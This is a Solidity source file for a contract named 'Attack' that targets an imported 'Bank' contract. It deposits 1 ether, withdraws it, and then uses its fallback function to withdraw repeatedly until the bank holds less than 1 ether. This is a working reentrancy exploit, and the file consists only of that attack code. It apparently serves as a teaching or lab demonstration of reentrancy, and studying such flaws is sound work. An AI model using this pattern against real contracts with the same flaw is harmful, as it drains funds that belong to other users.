pragma solidity ^0.8.19;
import "./Bank.sol";
// SPDX-License-Identifier: UNLICENSED 
contract Attack {
    Bank _bank;
    constructor(address bank) {
        _bank = Bank(bank);
    }

    fallback() external payable {
        if (address(_bank).balance >= 1 ether) {
            _bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        _bank.deposit{value: 1 ether}();
        _bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}